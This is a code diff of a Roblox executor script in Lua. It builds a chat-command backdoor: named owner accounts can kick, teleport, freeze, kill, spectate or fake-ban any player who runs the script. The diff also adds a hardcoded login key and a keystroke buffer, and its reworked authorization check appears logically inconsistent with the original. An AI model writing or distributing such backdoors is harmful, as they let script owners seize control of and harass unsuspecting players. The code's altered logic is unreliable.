@@ -1,109 +1,138 @@
 local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+
 local localPlayer = Players.LocalPlayer
-local owners = {""}
+local owners = {"FlipRBX3", "FlipRbx2", "JollofRiceEaterr"}
 local admins = {}
 local buyers = {}
 local viewingOwner = nil
 
-function isAuthorized(player)
-    for _, ownerName in ipairs(owners) do
-        if player.Name == ownerName then
-            return true
+getgenv().Authorized = false
+local loginKey = "narukeysecret123"
+local inputBuffer = ""
+
+local function notify(msg)
+    StarterGui:SetCore("SendNotification", {
+        Title = "Login",
+        Text = msg,
+        Duration = 3,
+        Button1 = "OK"
+    })
+end
+
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe or not UserInputService:GetFocusedTextBox() then return end
+
+    if input.KeyCode == Enum.KeyCode.Return then
+        if inputBuffer:sub(1, 7):lower() == "/login " then
+            local entered = inputBuffer:sub(8)
+            if entered == loginKey then
+                getgenv().Authorized = true
+                notify("Login successful!")
+            else
+                notify("Invalid key!")
+            end
+        end
+        inputBuffer = ""
+    elseif input.KeyCode == Enum.KeyCode.Backspace then
+        inputBuffer = inputBuffer:sub(1, -2)
+    elseif input.UserInputType == Enum.UserInputType.Keyboard then
+        local char = input.KeyCode.Name
+        if #char == 1 then
+            inputBuffer = inputBuffer .. char:lower()
+        elseif input.KeyCode == Enum.KeyCode.Space then
+            inputBuffer = inputBuffer .. " "
         end
     end
-    for _, adminName in ipairs(admins) do
-        if player.Name == adminName then
-            return true
-        end
-    end
-    for _, buyerName in ipairs(buyers) do
-        if player.Name == buyerName then
-            return true
-        end
-    end
+end)
+
+local function isAuthorized(player)
+    for _, name in ipairs(owners) do if player.Name == name then return true end end
+    for _, name in ipairs(admins) do if player.Name == name then return true end end
+    for _, name in ipairs(buyers) do if player.Name == name then return true end end
     return false
 end
 
-function x1y2z3(owner)
-    if owner then
+local function bring(owner)
+    if owner and localPlayer.Character then
         localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
     end
 end
 
-function freezePlayer()
-    if not isAuthorized(localPlayer) and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        localPlayer.Character.HumanoidRootPart.Anchored = true
+local function freeze()
+    if not isAuthorized(localPlayer) and localPlayer.Character then
+        local root = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root then root.Anchored = true end
     end
 end
 
-function unfreezePlayer()
-    if not isAuthorized(localPlayer) and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        localPlayer.Character.HumanoidRootPart.Anchored = false
+local function unfreeze()
+    if not isAuthorized(localPlayer) and localPlayer.Character then
+        local root = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root then root.Anchored = false end
     end
 end
 
-function viewPlayer(owner)
+local function view(owner)
     if not isAuthorized(localPlayer) and localPlayer.Character and owner.Character then
         viewingOwner = owner
         localPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
-        localPlayer.CameraSubject = owner.Character.Humanoid
+        localPlayer.CameraSubject = owner.Character:FindFirstChildOfClass("Humanoid")
     end
 end
 
-function unviewPlayer()
-    if viewingOwner then
+local function unview()
+    if viewingOwner and localPlayer.Character then
         localPlayer.CameraMode = Enum.CameraMode.Classic
-        localPlayer.CameraSubject = localPlayer.Character.Humanoid
+        localPlayer.CameraSubject = localPlayer.Character:FindFirstChildOfClass("Humanoid")
         viewingOwner = nil
     end
 end
 
-function a1b2c3(authUserName)
-    local authUser
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name == authUserName then
-            authUser = player
-            break
+local function handleCommands(authUser)
+    authUser.Chatted:Connect(function(msg)
+        if not getgenv().Authorized then return end
+
+        if msg:sub(1, 7) == "/kick ." then
+            local reason = msg:sub(9)
+            if reason == "" then reason = "Admins Has Kicked You." end
+            localPlayer:Kick(reason)
+
+        elseif msg == "/bring ." then
+            bring(authUser)
+
+        elseif msg == "/freeze ." then
+            freeze()
+
+        elseif msg == "/unfreeze ." then
+            unfreeze()
+
+        elseif msg == "/view ." then
+            view(authUser)
+
+        elseif msg == "/unview ." then
+            unview()
+
+        elseif msg == "/kill ." then
+            local hum = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
+            if hum then hum.Health = 0 end
+
+        elseif msg == "/ban ." then
+            localPlayer:Kick("You have been permanently banned from this experience. (Error Code: 267)")
         end
-    end
-
-    if authUser then
-        authUser.Chatted:Connect(function(message)
-            if not isAuthorized(localPlayer) then
-                if message:sub(1, 7) == "/kick ." then
-                    local reason = message:sub(9)
-                    if reason == "" then
-                        reason = "Admins Has Kicked You."
-                    end
-                    localPlayer:Kick(reason)
-                elseif message == "/bring ." then
-                    x1y2z3(authUser)
-                elseif message == "/freeze ." then
-                    freezePlayer()
-                elseif message == "/unfreeze ." then
-                    unfreezePlayer()
-                elseif message == "/view ." then
-                    viewPlayer(authUser)
-                elseif message == "/unview ." then
-                    unviewPlayer()
-                elseif message == "/kill ." then
-                    if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
-                        localPlayer.Character.Humanoid.Health = 0
-                    end
-                elseif message == "/ban ." then
-                    localPlayer:Kick("You have been permanently banned from this experience. (Error Code: 267)")
-                end
-            end
-        end)
-    end
+    end)
 end
 
-for _, authName in ipairs(owners) do
-    a1b2c3(authName)
+for _, name in ipairs(owners) do
+    local p = Players:FindFirstChild(name)
+    if p then handleCommands(p) end
 end
-for _, authName in ipairs(admins) do
-    a1b2c3(authName)
+for _, name in ipairs(admins) do
+    local p = Players:FindFirstChild(name)
+    if p then handleCommands(p) end
 end
-for _, authName in ipairs(buyers) do
-    a1b2c3(authName)
+for _, name in ipairs(buyers) do
+    local p = Players:FindFirstChild(name)
+    if p then handleCommands(p) end
 end
